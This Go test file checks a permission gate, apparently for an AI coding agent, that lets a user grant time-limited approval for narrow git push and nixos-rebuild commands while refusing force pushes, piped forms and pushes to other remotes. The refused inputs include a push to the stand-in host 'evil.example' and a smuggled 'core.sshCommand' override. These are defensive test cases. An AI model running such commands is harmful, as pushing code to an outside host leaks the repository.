package main

import (
	"context"
	"encoding/json"
	"io"
	"strings"
	"testing"
	"time"
)

const allowed = `{"hookSpecificOutput":{"decision":{"behavior":"allow"},"hookEventName":"PermissionRequest"}}`

func TestGrantClass(t *testing.T) {
	g := gate{cwd: "/master", repos: fakeRepos{
		remote: map[string][]string{"/r": {"origin"}, "/changed": {"origin"}},
		change: map[string]string{"/master": "bosun cannot read", "/changed": "whose hook pre-push changed"},
	}}
	for cmd, want := range map[string]string{
		"git -C /r push":                                  "push",
		"git -C /r push origin main":                      "push",
		"git -C /r push -u origin HEAD:main":              "push",
		"git -C /r push --follow-tags -q origin main":     "push",
		"git -C /r push origin main 2>&1":                 "",
		"git -C /r push origin main | tail -3":            "",
		"cd /r && git push origin main":                   "",
		"git push origin main":                            "",
		"git -C /r push --force origin main":              "",
		"git -C /r push origin +main":                     "",
		"git -C /r push origin :main":                     "",
		"git -C /r push --mirror":                         "",
		"git -C /r push --all origin":                     "",
		"git -C /r push -o ci.skip origin main":           "",
		"git -C /r push --push-option=x origin main":      "",
		"git -C /r push https://evil.example/x.git main":  "",
		"git -C /r push upstream main":                    "",
		"git -C /changed push origin main":                "",
		"git -C /r -c core.sshCommand=x push origin main": "",
		"nixos-rebuild test --sudo --flake /etc/nixos":    "rebuild",
		"nixos-rebuild build --flake /etc/nixos#host":     "rebuild",
		"nxt": "rebuild",
		"nxc": "rebuild",
		"nixos-rebuild switch --flake /etc/nixos":                   "",
		"nixos-rebuild test --flake /etc/nixos/.claude/worktrees/b": "",
		"nxt 2>&1 | tail -15":                                       "",
		"sudo nxt":                                                  "",
		"npm test":                                                  "",
	} {
		in, _ := json.Marshal(map[string]any{"command": cmd, "dangerouslyDisableSandbox": true})
		if got := g.grantClass("Bash", in); got != want {
			t.Errorf("%q falls in %q, want %q", cmd, got, want)
		}
	}
	if got := g.grantClass("Write", json.RawMessage(`{"file_path":"/r/x"}`)); got != "" {
		t.Errorf("a write falls in %q", got)
	}
}

func TestParseUntil(t *testing.T) {
	now := time.Date(2026, 10, 28, 23, 0, 0, 0, time.Local)
	for in, want := range map[string]time.Time{
		"09:00": time.Date(2026, 10, 29, 9, 0, 0, 0, time.Local),
		"23:30": time.Date(2026, 10, 28, 23, 30, 0, 0, time.Local),
		"8h":    now.Add(8 * time.Hour),
	} {
		got, err := parseUntil(in, now)
		if err != nil || !got.Equal(want) {
			t.Errorf("parseUntil(%q) = %v, %v, want %v", in, got, err, want)
		}
	}
	for _, in := range []string{"25h", "-1h", "tomorrow", now.Add(-time.Minute).Format(time.RFC3339)} {
		if _, err := parseUntil(in, now); err == nil {
			t.Errorf("parseUntil(%q) took it", in)
		}
	}
}

func grant(t *testing.T, class, until string) string {
	t.Helper()
	return mustCall(t, Request{Op: "grant", Name: class, Text: until}).Text
}

// masterAsks runs the master's PermissionRequest for command, and returns what the hook printed.
func masterAsks(t *testing.T, command string) string {
	t.Helper()
	return receive(t, runHookAsync(masterNode, hookEvent("PermissionRequest", "", "Bash", map[string]any{"command": command, "dangerouslyDisableSandbox": true})))
}

// A grant settles the master's call of its class only while the user is away, and the log names it. The master's other calls park.
func TestGrantSettlesWhileAway(t *testing.T) {
	d, _ := testDaemon(t)
	_, next := watchKinds(t)
	if text := grant(t, "rebuild", "8h"); !strings.Contains(text, "Grant g1") || !strings.Contains(text, "applies once it goes on") {
		t.Fatalf("grant said %q", text)
	}
	awaitEvent(t, next, "grants")

	hook := runHookAsync(masterNode, hookEvent("PermissionRequest", "", "Bash", map[string]any{"command": "nxt"}))
	dec := openDecision(t, 1)
	if dec.Holder != "user" || dec.Class != "rebuild" {
		t.Fatalf("with away mode off, the master's rebuild opened %+v", dec)
	}
	mustCall(t, Request{Op: "deny", ID: dec.ID})
	receive(t, hook)

	goAway(t, "off to bed")
	if out := masterAsks(t, "nxt"); out != allowed {
		t.Fatalf("the master's rebuild printed %s", out)
	}
	if out := masterAsks(t, "nxt 2>&1 | tail"); out != parkedDeny("PermissionRequest") {
		t.Fatalf("the master's piped rebuild printed %s", out)
	}
	noDecisions(t)
	hook = runHookAsync("a", hookEvent("PermissionRequest", "", "Bash", map[string]any{"command": "nxt"}))
	if dec := openDecision(t, 1); dec.Holder != "master" {
		t.Fatalf("a worker's rebuild opened %+v", dec)
	}
	mustCall(t, Request{Op: "deny", Node: masterNode, ID: openDecision(t, 1).ID})
	receive(t, hook)

	d.mu.Lock()
	defer d.mu.Unlock()
	var granted, settled *Entry
	for i, e := range d.logged {
		switch {
		case e.Kind == "granted":
			granted = &d.logged[i]
		case e.Kind == "settled" && e.Grant != nil:
			if settled != nil {
				t.Fatalf("two decisions settled under a grant: %+v", e)
			}
			settled = &d.logged[i]
		}
	}
	if granted == nil || granted.Grant.ID != "g1" || granted.By != "user" {
		t.Fatalf("granted entry %+v", granted)
	}
	if settled == nil || settled.Grant.ID != "g1" || settled.Grant.Class != "rebuild" || settled.Behavior != "allow" || settled.By != "bosun" || settled.Node != masterNode {
		t.Fatalf("settled entry %+v", settled)
	}
	if !strings.Contains(logLine(*settled), "under grant g1 (rebuild)") {
		t.Fatalf("the log shows %q", logLine(*settled))
	}
}

// A grant of push allows the master's push from a repository bosun recorded, and not a force push from it.
func TestGrantPush(t *testing.T) {
	d, _ := testDaemon(t)
	_, repo, _ := recorded(t)
	if err := d.repos().record(repo); err != nil {
		t.Fatal(err)
	}
	grant(t, "push", "09:00")
	goAway(t, "")
	if out := masterAsks(t, "git -C "+repo+" push origin main"); out != allowed {
		t.Fatalf("the master's push printed %s", out)
	}
	if out := masterAsks(t, "git -C "+repo+" push origin main 2>&1"); out != parkedDeny("PermissionRequest") {
		t.Fatalf("the master's redirected push printed %s", out)
	}
	force := runHookAsync(masterNode, hookEvent("PreToolUse", "t1", "Bash", map[string]any{"command": "git -C " + repo + " push --force origin main", "dangerouslyDisableSandbox": true}))
	if out := receive(t, force); out != parkedDeny("PreToolUse") {
		t.Fatalf("the master's force push printed %s", out)
	}
}

// No grant settles a reserved action on the user's list, whatever class it carries.
func TestGrantNeverSettlesUserOnly(t *testing.T) {
	d, _ := testDaemon(t)
	grant(t, "push", "8h")
	goAway(t, "")
	d.mu.Lock()
	dec := &Decision{Kind: "permission", Node: masterNode, Holder: "user", Reserved: "a force push", UserOnly: true, Class: "push", Tool: "Bash", Input: json.RawMessage(`{"command":"git push"}`)}
	parked := d.openLocked(dec)
	a := <-dec.answer
	d.mu.Unlock()
	if !parked || a.behavior != "deny" || a.text != parkedCall {
		t.Fatalf("a userOnly decision of class push got %+v, parked %v", a, parked)
	}
}

// A revoked grant and one past its time settle nothing, and each end is logged.
func TestGrantEnds(t *testing.T) {
	d, _ := testDaemon(t)
	grant(t, "rebuild", "8h")
	goAway(t, "")
	if text := mustCall(t, Request{Op: "revoke", ID: "g1"}).Text; text != "Revoked grant g1." {
		t.Fatalf("revoke said %q", text)
	}
	if out := masterAsks(t, "nxt"); out != parkedDeny("PermissionRequest") {
		t.Fatalf("after the revoke the master's rebuild printed %s", out)
	}
	if _, err := call(context.Background(), Request{Op: "revoke", ID: "g1"}); err == nil {
		t.Fatal("revoked g1 twice")
	}

	grant(t, "rebuild", "8h")
	d.mu.Lock()
	d.grants[0].Until = time.Now().Add(-time.Second)
	d.mu.Unlock()
	if out := masterAsks(t, "nxt"); out != parkedDeny("PermissionRequest") {
		t.Fatalf("past its time the grant allowed the master's rebuild: %s", out)
	}
	d.expireGrants(time.Now())
	d.mu.Lock()
	defer d.mu.Unlock()
	if len(d.grants) != 0 {
		t.Fatalf("grants after expiry: %+v", d.grants)
	}
	kinds := map[string]int{}
	for _, e := range d.logged {
		kinds[e.Kind]++
	}
	if kinds["granted"] != 2 || kinds["revoked"] != 1 || kinds["expired"] != 1 {
		t.Fatalf("logged %v", kinds)
	}
}

// Grants outlast a restart of the daemon, and their ids keep counting.
func TestGrantOutlastsRestart(t *testing.T) {
	d, _ := testDaemon(t)
	grant(t, "rebuild", "8h")
	goAway(t, "")
	restart(t, d)
	s := mustCall(t, Request{Op: "status"})
	if len(s.Grants) != 1 || s.Grants[0].ID != "g1" {
		t.Fatalf("after a restart grants = %+v", s.Grants)
	}
	if out := masterAsks(t, "nxt"); out != allowed {
		t.Fatalf("after a restart the master's rebuild printed %s", out)
	}
	if text := grant(t, "push", "1h"); !strings.Contains(text, "Grant g2") {
		t.Fatalf("the next grant said %q", text)
	}
}

// Only the user gives grants: from a frontend, or through the desk quoting their latest message.
func TestGrantCallers(t *testing.T) {
	testDesk(t)
	if _, err := call(context.Background(), Request{Op: "grant", Node: masterNode, Name: "push", Text: "8h"}); err == nil {
		t.Fatal("the master gave a grant")
	}
	if _, err := call(context.Background(), Request{Op: "grant", Name: "anything", Text: "8h"}); err == nil {
		t.Fatal("a grant of an unknown class")
	}
	desk := newMCPServer(deskNode, nil)
	deskSays(t, "push what you merge tonight, until 9")
	if _, err := desk.run(context.Background(), "grant", json.RawMessage(`{"class":"push","until":"09:00","words":"merge everything"}`)); err == nil {
		t.Fatal("the desk gave a grant on words the user did not say")
	}
	if _, err := desk.run(context.Background(), "grant", json.RawMessage(`{"class":"push","until":"09:00","words":"push what you merge tonight"}`)); err != nil {
		t.Fatal(err)
	}
	if text, err := desk.run(context.Background(), "revoke", json.RawMessage(`{"id":"g1","words":"push what you merge"}`)); err != nil || text != "Revoked grant g1." {
		t.Fatalf("the desk's revoke said %q, %v", text, err)
	}
}

// The master hears of each live grant with its batch, and bosun status lists them.
func TestGrantShown(t *testing.T) {
	testDaemon(t)
	grant(t, "push", "8h")
	goAway(t, "bye")
	mustCall(t, Request{Op: "tell", Text: "fix it"})
	out, err := newMCPServer(masterNode, io.Discard).run(context.Background(), "next_event", nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "standing grants") || !strings.Contains(out, "g1 until") || !strings.Contains(out, "git -C <repo> push") {
		t.Fatalf("next_event returned %s", out)
	}
	var b strings.Builder
	printStatus(&b, mustCall(t, Request{Op: "status"}))
	if !strings.Contains(b.String(), "Standing grants, which bosun acts on while you are away:\n  g1   push") {
		t.Fatalf("status shows\n%s", b.String())
	}
}
